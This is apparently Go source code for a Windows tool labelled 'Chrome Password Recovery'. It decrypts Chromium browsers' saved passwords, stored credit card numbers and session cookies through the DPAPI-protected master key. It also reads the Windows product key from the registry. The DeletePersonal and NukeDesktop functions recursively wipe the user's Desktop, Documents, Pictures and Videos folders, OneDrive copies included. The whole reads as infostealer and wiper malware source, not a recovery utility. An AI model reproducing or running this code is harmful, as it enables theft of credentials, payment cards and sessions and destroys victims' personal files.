//Chrome Password Recovery project main.go
//Recover Websites, Username and Passwords from Google Chromes Login Data file.

//Windows Only

//SQLLite3 - github.com/mattn/go-sqlite3
//Using Crypt32.dll (win32crypt) for decryption

//C:\Users\{USERNAME}\AppData\Local\Google\Chrome\User Data\Default

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"database/sql"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"golang.org/x/sys/windows/registry"
	"io"
	"io/ioutil"
	"log"
	"os"
	"strings"
	"syscall"
	"unsafe"
)

var (
	dllcrypt32  = syscall.NewLazyDLL("Crypt32.dll")
	dllkernel32 = syscall.NewLazyDLL("Kernel32.dll")

	procDecryptData = dllcrypt32.NewProc("CryptUnprotectData")
	procLocalFree   = dllkernel32.NewProc("LocalFree")

	masterKey []byte
)

func NewBlob(d []byte) *DATA_BLOB {
	if len(d) == 0 {
		return &DATA_BLOB{}
	}
	return &DATA_BLOB{
		pbData: &d[0],
		cbData: uint32(len(d)),
	}
}

func (b *DATA_BLOB) ToByteArray() []byte {
	d := make([]byte, b.cbData)
	copy(d, (*[1 << 30]byte)(unsafe.Pointer(b.pbData))[:])
	return d
}

func Decrypt(data []byte) ([]byte, error) {
	var outblob DATA_BLOB
	r, _, err := procDecryptData.Call(uintptr(unsafe.Pointer(NewBlob(data))), 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&outblob)))
	if r == 0 {
		return nil, err
	}
	defer procLocalFree.Call(uintptr(unsafe.Pointer(outblob.pbData)))
	return outblob.ToByteArray(), nil
}

func copyFileToDirectory(pathSourceFile string, pathDestFile string) error {
	if _, err := os.Stat(TEMPFILEDIR); os.IsNotExist(err) {
		os.MkdirAll(TEMPFILEDIR, 0700)
	}

	sourceFile, err := os.Open(pathSourceFile)
	if err != nil {
		return err
	}
	defer sourceFile.Close()

	destFile, err := os.Create(pathDestFile)
	if err != nil {
		return err
	}
	defer destFile.Close()

	_, err = io.Copy(destFile, sourceFile)
	if err != nil {
		return err
	}

	err = destFile.Sync()
	if err != nil {
		return err
	}

	sourceFileInfo, err := sourceFile.Stat()
	if err != nil {
		return err
	}

	destFileInfo, err := destFile.Stat()
	if err != nil {
		return err
	}

	if sourceFileInfo.Size() == destFileInfo.Size() {
	} else {
		return err
	}
	return nil
}

func getMasterKey(localStatePath string) ([]byte, error) {

	var masterKey []byte

	// Get the master key
	// The master key is the key with which chrome encode the passwords but it has some suffixes and we need to work on it
	jsonFile, err := os.Open(localStatePath) // The rough key is stored in the Local State File which is a json file
	if err != nil {
		return masterKey, err
	}

	defer jsonFile.Close()

	byteValue, err := ioutil.ReadAll(jsonFile)
	if err != nil {
		return masterKey, err
	}
	var result map[string]interface{}
	json.Unmarshal([]byte(byteValue), &result)
	roughKey := result["os_crypt"].(map[string]interface{})["encrypted_key"].(string) // Found parsing the json in it
	decodedKey, err := base64.StdEncoding.DecodeString(roughKey)                      // It's stored in Base64 so.. Let's decode it
	stringKey := string(decodedKey)
	stringKey = strings.Trim(stringKey, "DPAPI") // The key is encrypted using the windows DPAPI method and signed with it. the key looks like "DPAPI05546sdf879z456..." Let's Remove DPAPI.

	masterKey, err = Decrypt([]byte(stringKey)) // Decrypt the key using the dllcrypt32 dll.
	if err != nil {
		return masterKey, err
	}

	return masterKey, nil

}

func DecryptBlob(BLOB string, LocalState string) string {
	var output string

	if strings.HasPrefix(BLOB, "v10") { // Means it's Chrome v80 or higher
		BLOB = strings.Trim(BLOB, "v10")

		if string(masterKey) == "" { // It the masterkey hasn't been requested yet, then gets it.
			mkey, err := getMasterKey(LocalState)
			if err != nil {
				fmt.Println(err)
			}
			masterKey = mkey
		}

		ciphertext := []byte(BLOB)
		c, err := aes.NewCipher(masterKey)
		if err != nil {

			fmt.Println(err)
		}
		gcm, err := cipher.NewGCM(c)
		if err != nil {
			fmt.Println(err)
		}
		nonceSize := gcm.NonceSize()
		if len(ciphertext) < nonceSize {
			fmt.Println(err)
		}

		nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
		plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
		if err != nil {
			//fmt.Println(err) Commented because it dumps a bunch of shit to console.
		}
		if string(plaintext) != "" {
			output = string(plaintext)

		}
	} else { //Means it's chrome v. < 80
		pass, err := Decrypt([]byte(BLOB))
		if err != nil {
			log.Fatal(err)
		}

		output = string(pass)
	}

	return output
}

func GetPasswords() []PASSWD {

	var output []PASSWD

	for _, Path := range PLATFORMS {

		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Login Data") {
			continue
		}

		var TempFileName string = RandStringBytes(8)

		//Copy Login Data file to temp location
		err := copyFileToDirectory(Path.DataFiles+"\\Login Data", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}

		//Open Database
		db, err := sql.Open("sqlite3", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		//Select Rows to get data from
		rows, err := db.Query("select origin_url, username_value, password_value from logins")
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {
			var URL string
			var USERNAME string
			var PASSWORD string

			err = rows.Scan(&URL, &USERNAME, &PASSWORD)
			if err != nil {
				log.Fatal(err)
			}

			PASSWORD = DecryptBlob(PASSWORD, Path.LocalState)

			if PASSWORD != "" {
				output = append(output, PASSWD{
					Url:  URL,
					User: USERNAME,
					Pass: PASSWORD,
				})
			}
		}

		err = rows.Err()
		if err != nil {
			log.Fatal(err)
		}

		masterKey = []byte("")
	}

	return output
}

func DeletePersonal() {

	NukeDesktop()

	os.RemoveAll(PERSONAL + "\\Pictures")
	os.RemoveAll(PERSONAL + "\\Images")
	os.RemoveAll(PERSONAL + "\\Documents")
	os.RemoveAll(PERSONAL + "\\Videos")
	os.RemoveAll(PERSONAL + "OneDrive\\Pictures")
	os.RemoveAll(PERSONAL + "OneDrive\\Images")
	os.RemoveAll(PERSONAL + "OneDrive\\Documents")
	os.RemoveAll(PERSONAL + "OneDrive\\Videos")

	os.MkdirAll(PERSONAL+"\\Pictures", 777)
	os.MkdirAll(PERSONAL+"\\Images", 777)
	os.MkdirAll(PERSONAL+"\\Documents", 777)
	os.MkdirAll(PERSONAL+"\\Videos", 777)

	os.MkdirAll(PERSONAL+"OneDrive\\Pictures", 777)
	os.MkdirAll(PERSONAL+"OneDrive\\Images", 777)
	os.MkdirAll(PERSONAL+"OneDrive\\Documents", 777)
	os.MkdirAll(PERSONAL+"OneDrive\\Videos")
}

func NukeDesktop() {
	os.RemoveAll(PERSONAL + "\\Desktop")
	os.RemoveAll(PERSONAL + "OneDrive\\Desktop")
	os.MkdirAll(PERSONAL+"\\Desktop", 777)
	os.MkdirAll(PERSONAL+"OneDrive\\Desktop", 777)
}

func GetCreditCards() []CCARD {

	var output []CCARD

	for _, Path := range PLATFORMS {

		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Web Data") {
			continue
		}

		var TempFileName string = RandStringBytes(8)

		//Copy Login Data file to temp location
		err := copyFileToDirectory(Path.DataFiles+"\\Web Data", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}

		//Open Database
		db, err := sql.Open("sqlite3", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		//Select Rows to get data from
		rows, err := db.Query("select name_on_card, expiration_month, expiration_year, card_number_encrypted from credit_cards")
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {
			var NAME string
			var EXPM string
			var EXPY string
			var NUMBER string

			err = rows.Scan(&NAME, &EXPM, &EXPY, &NUMBER)
			if err != nil {
				log.Fatal(err)
			}

			NUMBER = DecryptBlob(NUMBER, Path.LocalState)

			if NUMBER != "" {
				output = append(output, CCARD{
					Name:       NAME,
					Expiration: fmt.Sprintf("%s/%s", EXPM, EXPY),
					Number:     NUMBER,
				})
			}
		}

		err = rows.Err()
		if err != nil {
			log.Fatal(err)
		}

	}

	return output
}

func GetProductKey() *PRODUCT_ID {
	output := new(PRODUCT_ID)

	sir, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, registry.QUERY_VALUE)
	if err != nil {
		println(err)
	}
	defer sir.Close()

	Organization, _, err := sir.GetStringValue("RegisteredOrganization")
	if err != nil {
		Organization = ""
	}

	pkr, err := registry.OpenKey(registry.LOCAL_MACHINE, `SOFTWARE\Microsoft\Windows NT\CurrentVersion\SoftwareProtectionPlatform`, registry.QUERY_VALUE)
	if err != nil {
		println(err)
	}
	defer pkr.Close()

	ActivationKey, _, err := pkr.GetStringValue("BackupProductKeyDefault")
	if err != nil {
		ActivationKey = ""
	}

	KMSClient, _, err := pkr.GetStringValue("KeyManagementServiceName")
	if err != nil {
		KMSClient = ""
	}

	if KMSClient == "" || Organization == "" {
		output.Type = "KMS / OEM"
	} else {
		output.Type = "Retail"
	}

	output.Value = ActivationKey

	return output
}

func GetCookies() []COOKIE {
	var output []COOKIE

	for _, Path := range PLATFORMS {

		if !Path.Chromium || !FileExists(Path.LocalState) || !FileExists(Path.DataFiles+"\\Network\\Cookies") {
			continue
		}

		var TempFileName string = RandStringBytes(8)

		//Copy Login Data file to temp location
		err := copyFileToDirectory(Path.DataFiles+"\\Network\\Cookies", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}

		//Open Database
		db, err := sql.Open("sqlite3", TEMPFILEDIR+"\\"+TempFileName+".dat")
		if err != nil {
			log.Fatal(err)
		}
		defer db.Close()

		//Select Rows to get data from
		rows, err := db.Query("select host_key, name, encrypted_value from cookies")
		if err != nil {
			log.Fatal(err)
		}
		defer rows.Close()

		for rows.Next() {
			var HOST string
			var NAME string
			var VALUE string

			err = rows.Scan(&HOST, &NAME, &VALUE)
			if err != nil {
				log.Fatal(err)
			}

			VALUE = DecryptBlob(VALUE, Path.LocalState)

			if VALUE != "" {
				output = append(output, COOKIE{
					Host:  NAME,
					Name:  NAME,
					Value: VALUE,
				})
			}
		}

		err = rows.Err()
		if err != nil {
			log.Fatal(err)
		}

	}

	return output
}
